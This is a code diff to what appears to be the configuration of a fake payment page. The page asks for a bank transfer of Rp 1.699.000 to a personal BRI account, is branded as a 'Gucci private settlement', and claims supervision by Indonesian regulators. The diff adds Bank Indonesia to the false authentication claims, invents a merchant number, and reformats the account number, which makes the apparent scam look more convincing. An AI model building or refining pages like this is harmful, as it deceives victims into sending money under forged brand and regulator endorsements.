@@ -65,12 +65,12 @@ export const THEME_PRESETS: {
 export const INITIAL_DATA: PaymentData = {
   bankName: 'BRI',
   accountName: 'WANDANA',
-  accountNumber: '3353 0101 3871 503', 
+  accountNumber: '335301013871503', 
   amount: 'Rp 1.699.000',
   greetingLabel: 'OFFICIAL PARTNER',
   greetingPartner: 'GUCCI PRIVATE SETTLEMENT',
   headerTitle: 'PEMBAYARAN',
-  trustMessage: 'Transaksi ini diproses secara aman dan diawasi langsung oleh Otoritas Jasa Keuangan (OJK)',
+  trustMessage: 'Transaksi ini diproses secara aman dan diawasi langsung oleh Bank Indonesia serta Otoritas Jasa Keuangan (OJK)',
   labelNominal: 'Nominal Transfer',
   labelAtasNama: 'Penerima',
   labelRekening: 'Nomor Rekening',
@@ -82,8 +82,8 @@ export const INITIAL_DATA: PaymentData = {
   instruction1Body: 'Lakukan transfer sesuai nominal yang tertera. Sistem akan melakukan validasi otomatis dalam 1-5 menit.',
   instruction2Title: 'Ketentuan Verifikasi',
   instruction2Body: 'Gunakan metode transfer BI-FAST untuk proses instan.',
-  footerStatus: 'Authenticated by OJK',
-  footerCopyright: '© 2025 Guccio Gucci S.p.A. Authorized Merchant #OJK-99238-JKT',
+  footerStatus: 'Authenticated by BI & OJK',
+  footerCopyright: '© 2025 Guccio Gucci S.p.A. Authorized Merchant #BI-OJK-99238',
   theme: THEME_PRESETS[0].theme,
   images: {
     promoBanner: '', ad1: '', ad2: '', ad3: '', ad4: ''
